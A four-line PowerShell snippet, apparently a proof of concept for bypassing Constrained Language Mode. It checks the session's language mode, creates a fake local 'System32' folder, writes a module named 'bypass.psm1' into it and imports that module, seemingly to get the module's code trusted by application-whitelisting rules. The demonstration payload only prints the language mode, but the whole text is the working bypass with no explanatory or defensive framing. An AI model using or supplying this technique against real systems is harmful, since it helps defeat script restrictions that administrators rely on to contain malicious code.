$Host.Runspace.LanguageMode
mkdir System32
'Write-Host ($Host.Runspace.LanguageMode)' | Out-File .\System32\bypass.psm1
Import-Module .\System32\bypass.psm1 -Force